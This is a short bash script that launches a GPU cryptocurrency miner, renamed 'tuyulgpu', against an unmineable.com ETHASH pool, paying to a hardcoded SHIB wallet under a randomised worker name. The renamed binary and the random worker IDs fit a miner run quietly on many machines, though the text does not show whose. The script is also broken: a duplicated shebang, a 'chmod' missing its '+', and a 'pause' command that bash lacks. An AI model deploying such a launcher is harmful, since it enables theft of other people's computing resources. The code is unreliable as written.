#!/bin/bash

#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0x37c76c96067b6f37428840b1b4461f14405d56b3
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-teady#pr1d-5r70)
chmod  x tuyulgpu


cd "$(dirname "$0")"

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
pause $@
